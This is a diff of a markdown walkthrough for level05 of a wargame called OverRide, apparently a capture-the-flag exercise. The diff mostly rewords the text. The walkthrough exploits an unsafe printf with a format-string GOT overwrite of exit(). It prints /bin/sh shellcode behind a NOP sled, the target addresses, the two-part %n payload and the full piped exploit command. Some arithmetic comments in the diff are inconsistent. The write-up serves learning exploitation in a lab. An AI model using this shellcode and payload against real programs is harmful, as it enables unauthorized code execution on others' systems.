@@ -24,7 +24,7 @@ aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
 aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaalevel05@OverRide:~$
 ```
 
-The program looks to `gets` the user input and prints it back.
+The program reads user input with `gets()` and prints it back.
 
 ## 2. Analyze The Executable
 
@@ -45,16 +45,15 @@ Here, we find only the function: `main`.
 
 #### main function
 
-blablabla
+The `main` function reads user input using `fgets()`, converts each lowercase letter to uppercase, then prints the result using `printf()`. Finally, it calls `exit()`.
 
-## 3. Identify The Vulnerability
+## 3. Exploit Development
 
-In this program, there is a unsafe use of `printf` :
+In this program, there is an unsafe use of `printf` :
 ```c
       printf((char *)local_78);
 ```
-
-So we can process to a Format String Attack. And we are gonna use this sort of structure :
+So we can perform a Format String Attack. And We will use this sort of structure :
 
 ```
 <memory address to update>	<padding>	<%X$n>
@@ -76,7 +75,7 @@ Structure:
 
 ---
 
-And in this level, is specifically a GOT Overwrite Attack.
+In this level, we will specifically perform a GOT Overwrite Attack.
 
 ### PLT (Procedure Linkage Table) & GOT (Global Offset Table)
 
@@ -129,7 +128,7 @@ exit() executes directly
 
 ---
 
-First we can see there is no `system()` calls to redirect to. So we are gonna use a shellcode :
+First, we can see there is no `system()` call to redirect to. So we are gonna use a shellcode :
 
 ```
 \x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80
@@ -137,7 +136,7 @@ First we can see there is no `system()` calls to redirect to. So we are gonna us
 
 *(This one was taken form [shell-storm](https://shell-storm.org/shellcode/files/shellcode-841.html).)*
 
-And we are gonna store it in the environnement with several NOP instruction *(to simplify the access of the address shellcode)* :
+We will store it in the environment with several NOP instruction *(to simplify the access of the address shellcode)* :
 
 ```bash
 export SHELLCODE=$(python -c 'print "\x90" * 100 + "\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80" ')
@@ -176,18 +175,18 @@ Dump of assembler code for function exit@plt:
    0x0804837b <+11>:	jmp    0x8048330
 ```
 
-The GOT address of exit and to overwrite is : `0x80497e0`. In little-endian :
+The GOT entry address for `exit()` is :  `0x80497e0`. In little-endian :
+
 ```
 \xe0\x97\x04\x08
 ```
 
 ---
 
-#### $SHELLCODE Address
+#### SHELLCODE Address
 
-
-Then we need to found the address of the `SHELLCODE` environement variable.
-We will do all the attack in a clear environment (using `env -i`) to simplify it.
+Then we need to find the address of the `SHELLCODE` environment variable.
+We will perform the attack in a clean environment *(using `env -i`)* to simplify it. 
 
 ```bash
 level05@OverRide:~$ env -i SHELLCODE=$(python -c 'print "\x90" * 100 + "\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80"') gdb ./level05 
@@ -213,9 +212,8 @@ COLUMNS=107
 
 ```
 
-So a address in the nopsled, for example `0xffffdf70`.
-
-So in decimal : `4294958960`.
+We choose an address in the NOP sled, for example:  `0xffffdf70`.
+In decimal : `4294958960`.
 
 ```
 <memory address to update>  +   <padding>	
@@ -223,40 +221,54 @@ So in decimal : `4294958960`.
 ```
 ---
 
-### Create the Payload
+### Create The Payload
 
 Usually we can do like this :
 ```bash
 python -c 'print "\xe0\x97\x04\x08" + "%4294958956x" + "%10$n"'
 ```
 
-But it's not gonna work, we need to split it in 2 :
+However, writing `4294958956` bytes would be too large and cause the program to crash. Instead, we **split the write into two 2-byte writes**:
+
+- Write the **lower 2 bytes** (`0xdf70`) to `0x80497e0`
+- Write the **upper 2 bytes** (`0xffff`) to `0x80497e2`
+
+The payload structure will be :
 ```
-[ first 2 bytes GOT ] + [ second 2 bytes GOT ] + [ last 4 bytes of SHELLCODE - 8 ] + %10$n +  [ last 4 bytes of SHELLCODE - (last 4 bytes of SHELLCODE) ] + %11$n
+[ first 2 bytes GOT ] + [ second 2 bytes GOT ] + [ lower 2 bytes - 8 ] + %10$n +  [ upper 2 bytes - (lower 2 bytes) ] + %11$n
 ```
 
-In the 2 first bytes, we putting the 4 last bytes, and in the 2 last bytes, we putting the 4 first bytes.
-
+For the lower 2 bytes, the value is:
 ```
 0xdf70	->	0x80497e0
-0xffff	->	0x80497e2
-____________________________
+(-8 beause of the 2 GOT addresses written before.) 
+
 0xdf70 - 8	->	0x80497e0
 57200 - 8	->	0x80497e0
-57200 - 8	->	0x80497e0
 57192		->	0x80497e0
-____________________________
-0xffff - 57200 	->	0x80497e2
-65535 - 57200 	->	0x80497e2
-8335 			->	0x80497e2
+:	57192
 ```
+
+For the upper 2 bytes, the value is:
+```
+0xffff	->	0x80497e2
+(-57192 beause of all the characters written before.) 
+
+0xffff - 57200	->	0x80497e2
+65535 - 57200	->	0x80497e2
+8335			->	0x80497e2
+:	8335
+```
+
+Therefore, the payload will be :
 
 ```bash
 python -c 'print "\xe0\x97\x04\x08" + "\xe2\x97\x04\x08" + "%57192d" + "%10$n" + "%8335d" + "%11$n"'
 ```
+
 ---
 
-Heree instead of writing 10000000 literal `a` characters *(for example)* *(which would cause a broken pipe)*, we can use a **width specifier** with `%x` to generate the padding, like this: `%10000000x`.
+Heree instead of writing 1000000 literal `a` characters *(for example)* *(which would cause a broken pipe)*, we can use a **width specifier** with `%x` to generate the padding, like this: `%1000000x`.
 
 `%x` **reads and prints** the value at the current position on the stack, then advances to the next stack argument.
 When a width is specified, `printf` uses it as a **minimum field width**.
@@ -276,7 +288,7 @@ Representing:
 
 ---
 
-With the `env -i` command :
+Using the `env -i` command to ensure a clean environment, this give the following payload :
 
 ```bash
 (python -c 'print "\xe0\x97\x04\x08" + "\xe2\x97\x04\x08" + "%57192d" + "%10$n" + "%8335d" + "%11$n"'; cat) | env -i SHELLCODE=$(python -c 'print "\x90" * 100 + "\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80"')
